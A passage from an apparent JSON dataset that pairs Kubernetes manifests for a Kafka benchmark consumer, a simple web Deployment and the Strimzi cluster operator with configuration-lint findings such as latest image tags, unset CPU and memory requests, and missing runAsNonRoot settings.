    "manifest_path": "data/manifests/the_stack_sample/sample_3111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-bench-consumer\nspec:\n  containers:\n  - name: consumer\n    image: quay.io/ibm/kar-kafka-bench\n    command:\n    - /kar/bin/consumer\n    env:\n    - name: KAFKA_BROKERS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_brokers\n    - name: KAFKA_ENABLE_TLS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_enable_tls\n    - name: KAFKA_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_password\n    - name: KAFKA_VERSION\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_version\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"consumer\" has cpu request 0"
  },
  {
    "id": "8343",
    "manifest_path": "data/manifests/the_stack_sample/sample_3111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kafka-bench-consumer\nspec:\n  containers:\n  - name: consumer\n    image: quay.io/ibm/kar-kafka-bench\n    command:\n    - /kar/bin/consumer\n    env:\n    - name: KAFKA_BROKERS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_brokers\n    - name: KAFKA_ENABLE_TLS\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_enable_tls\n    - name: KAFKA_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_password\n    - name: KAFKA_VERSION\n      valueFrom:\n        secretKeyRef:\n          name: kar.ibm.com.runtime-config\n          key: kafka_version\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"consumer\" has memory limit 0"
  },
  {
    "id": "8344",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web\" is using an invalid container image, \"greysd/kubernetes-intro:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8345",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"web\" does not expose port 8000 for the TCPSocket"
  },
  {
    "id": "8346",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8347",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "8348",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web-init\" does not have a read-only root file system"
  },
  {
    "id": "8349",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"web\" does not expose port 8000 for the HTTPGet"
  },
  {
    "id": "8350",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "8351",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web-init\" is not set to runAsNonRoot"
  },
  {
    "id": "8352",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "8353",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web-init\" has cpu request 0"
  },
  {
    "id": "8354",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "8355",
    "manifest_path": "data/manifests/the_stack_sample/sample_3114.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: web\n        version: v2\n    spec:\n      containers:\n      - image: greysd/kubernetes-intro:latest\n        name: web\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        readinessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          tcpSocket:\n            port: 8000\n      initContainers:\n      - name: web-init\n        image: busybox:1.31.0\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        args:\n        - echo \"Version 2\" > /app/index.html\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web-init\" has memory limit 0"
  },
  {
    "id": "8356",
    "manifest_path": "data/manifests/the_stack_sample/sample_3115.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.20.2\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"strimzi-cluster-operator\" is using an invalid container image, \"quay.io/strimzi/operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8357",
    "manifest_path": "data/manifests/the_stack_sample/sample_3115.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.20.2\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"strimzi-cluster-operator\" does not have a read-only root file system"
  },
  {
    "id": "8358",
    "manifest_path": "data/manifests/the_stack_sample/sample_3115.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.20.2\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"strimzi-cluster-operator\" not found"
  },
  {
    "id": "8359",
    "manifest_path": "data/manifests/the_stack_sample/sample_3115.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: 